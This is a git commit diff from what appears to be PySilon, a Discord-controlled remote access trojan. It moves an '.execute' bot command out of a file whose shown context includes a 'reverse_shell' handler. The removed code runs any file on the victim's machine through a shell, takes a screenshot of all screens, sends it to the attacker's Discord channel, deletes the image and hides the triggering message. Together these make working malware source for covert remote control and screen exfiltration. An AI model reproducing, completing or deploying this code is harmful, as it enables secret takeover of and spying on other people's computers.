487d1070caad4b74f388a3ec54ab8338a2eaa2ce
JuicyChann <nik.xeiladakis@gmail.com>
2024-04-22 21:43:49 +0300

    move `.execute` to file_management.py

--- resources/features/remote_cmd.py
+++ resources/features/remote_cmd.py
@@ -21,21 +21,3 @@ async def reverse_shell(ctx, cmd_command=None):
         await ctx.send('```End of command stdout```');
     else:
         return await ctx.send("```No command was given.```")
-
-@client.command(name="execute")
-async def execute_file(ctx, file_to_exec=None):
-    await ctx.message.delete()
-    if file_to_exec != None:
-        if os.path.exists(file_to_exec):
-            try:
-                subprocess.run('start "" "' + file_to_exec + '"', shell=True)
-                await asyncio.sleep(1)
-                ImageGrab.grab(all_screens=True).save('ss.png')
-                await ctx.send(embed=discord.Embed(title=pysilon_misc.current_time() + ' `[Executed: ' + file_to_exec + ']`').set_image(url='attachment://ss.png'), file=discord.File('ss.png'))
-                subprocess.run('del ss.png', shell=True)
-                await ctx.send('```Successfully executed: ' + file_to_exec + '```')
-            except Exception as e:
-                await ctx.send(f'```❗ Something went wrong...```\n{str(e)}')
-        else:
-            await ctx.send('```❗ File or directory not found.```')
-    else: return await ctx.send('```Syntax: .execute <path/to/file>```')
